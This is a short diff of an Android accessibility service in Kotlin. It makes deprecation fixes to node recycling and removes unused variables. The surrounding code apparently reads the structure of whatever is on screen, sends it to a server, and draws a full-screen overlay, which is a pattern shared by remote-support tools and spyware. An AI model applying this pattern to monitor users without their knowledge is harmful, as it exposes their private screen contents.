@@ -86,7 +86,8 @@ class ControleGestosService : AccessibilityService() {
                     if (raiz != null) {
                         val estrutura = extrairEstruturaTela(raiz)
                         enviarEstruturaParaServidor(estrutura)
-                        raiz.recycle()
+                        @Suppress("DEPRECATION")
+                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) raiz.recycle()
                     } else {
                         Log.w("KL", "rootInActiveWindow nulo")
                     }
@@ -339,10 +340,6 @@ class ControleGestosService : AccessibilityService() {
             WindowManager.LayoutParams.TYPE_PHONE
         }
 
-        val displayMetrics = resources.displayMetrics
-        val screenWidth = displayMetrics.widthPixels
-        val screenHeight = displayMetrics.heightPixels
-
         val params = WindowManager.LayoutParams(
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.MATCH_PARENT,
@@ -487,7 +484,8 @@ class ControleGestosService : AccessibilityService() {
 
         @Suppress("DEPRECATION")
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) campoAtivo.recycle()
-        raiz.recycle()
+        @Suppress("DEPRECATION")
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) raiz.recycle()
     }
 
     // ─── Serviço em primeiro plano ────────────────────────────────────────────
